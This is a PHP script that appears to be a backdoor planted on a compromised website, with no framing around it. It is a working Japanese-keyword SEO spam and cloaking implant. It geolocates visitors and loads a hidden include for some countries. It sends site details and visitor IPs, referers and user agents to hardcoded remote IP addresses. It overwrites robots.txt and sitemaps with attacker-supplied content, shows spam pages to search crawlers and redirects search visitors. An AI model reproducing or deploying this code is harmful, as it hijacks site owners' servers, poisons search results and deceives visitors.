<?php
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ip = getUserIP();
$api_url = "http://ip-api.com/json/{$ip}";
$response = file_get_contents($api_url);
$data = json_decode($response, true);

if ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US') {
    ob_start();
    include 'setting';
    $output = ob_get_clean();
    echo $output;
    exit();
}
?>

<?php
$req_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
$self = isset($_SERVER['PHP_SELF']) ? $_SERVER['PHP_SELF'] : '';
$a = 'http://173.208.214.34/z41006_1o/';
if(strstr($req_uri, 'discount.php')){
    $a = 'http://204.12.196.10/z41006_o/';
    $self = '/discount.php';
}
function curl_get_contents($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	$file_contents = curl_exec($ch);
	curl_close($ch);
	return $file_contents;
}
function getServerCont($url, $data = array()){
	$url = str_replace(' ', '+', $url);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 10);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
	$output = curl_exec($ch);
	$errorCode = curl_errno($ch);
	curl_close($ch);
	if(0 !== $errorCode){
		return false;
	}
	return $output;
}
function is_crawler($agent){
	$agent_check = false;
	$bots='googlebot|google|yahoo|bing|aol';
	if($agent){
		if(preg_match("/($bots)/si", $agent)){
			$agent_check = true;
		}
	}
	return $agent_check;
}
function check_refer($refer){
	$check_refer = false;
	$referbots = 'google.co.jp|yahoo.co.jp|google.com';
	if($refer){
		if(preg_match("/($referbots)/si", $refer)){
			$check_refer=true;
		}
	}
	return $check_refer;
}
$http = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://');
$domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
$ser_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '';
$req_url = $http.$domain.$req_uri;
$indata1 = $a."/indata.php";
$map1 = $a."/map.php";
$jump1 = $a."/jump.php";
$url_words = $a."/words.php";
$url_robots = $a."/robots.php";
if(strpos($req_uri, ".php")){
	$href1 = $http.$domain.$self;
}else{
	$href1 = $http.$domain;
}
$data1 = array();
$data1['domain'] = $domain;
$data1['req_uri'] = $req_uri;
$data1['href'] = $href1;
$data1['req_url'] = $req_url;
if(substr($req_uri, -6) == 'robots'){
	define('BASE_PATH',$_SERVER['DOCUMENT_ROOT']);
	$robots_cont = @file_get_contents(BASE_PATH.'/robots.txt');
	$data1['robots_cont'] = $robots_cont;
	$robots_cont = @getServerCont($url_robots, $data1);
	file_put_contents(BASE_PATH.'/robots.txt', $robots_cont);
	$robots_cont = @file_get_contents(BASE_PATH.'/robots.txt');
	if(strpos(strtolower($robots_cont),"sitemap")){
		echo 'robots.txt file create success!';
	}else{
		echo 'robots.txt file create fail!';
	}
	exit();
}
if(substr($req_uri, -4) == '.xml'){
	if(strpos($req_uri, "allsitemap.xml") || strpos($req_uri, "sitemap-index.xml") || strpos($req_uri, "sitemap-index-1.xml") || strpos($req_uri, "index.xml")){
		$str_cont = getServerCont($map1, $data1);
		header("Content-type:text/xml");
		echo $str_cont;
		exit();
	}
	if(strpos($req_uri, ".php")){
		$word4 = explode("?", $req_uri);
		$word4 = $word4[count($word4)-1];
		$word4 = str_replace(".xml", "", $word4);
	}else{
		$word4 = str_replace("/", "", $req_uri);
		$word4 = str_replace(".xml", "", $word4);
	}
	$data1['word'] = $word4;
	$data1['action'] = 'check_sitemap';
	$check_url4 = getServerCont($url_words, $data1);
	if($check_url4 == '1'){
		$str_cont = getServerCont($map1, $data1);
		header("Content-type:text/xml");
		echo $str_cont;
		exit();
	}
	$data1['action']="check_words";
	$check1 = getServerCont($url_words, $data1);
	if(strpos($req_uri, "map") > 0 || $check1 == '1'){
		$data1['action'] = "rand_xml";
	}
	$check_url4 = getServerCont($url_words, $data1);
	header("Content-type:text/xml");
	echo $check_url4;
	exit();
}
if(strpos($req_uri, ".php")){
	$main_shell = $http.$ser_name.$self;
	$data1['main_shell'] = $main_shell;
}else{
	$main_shell = $http.$ser_name;
	$data1['main_shell'] = $main_shell;
}
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$chk_refer = check_refer($referer);
$user_agent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
$res_crawl = is_crawler($user_agent);
if(strpos($req_uri, '.php')){
	$url_ext = '?';
}else{
	$url_ext = '/';
}
if(!$res_crawl && $chk_refer){
	$lang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
	if(preg_match('/ja/i', $lang) || preg_match("/^[a-z0-9]+[0-9]+$/", end(explode($url_ext, str_replace(array(".shtml",".html", ".htm"), "", $req_uri))))){
		$data1['ip'] = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
		$data1['referer'] = $referer;
		$data1['user_agent'] = $user_agent;
		echo getServerCont($jump1, $data1);
		exit();
	}	
}
if($res_crawl){
	$data1['http_user_agent'] = $user_agent;
	$ser_cont = getServerCont($indata1, $data1);
	echo $ser_cont;
	exit();
}
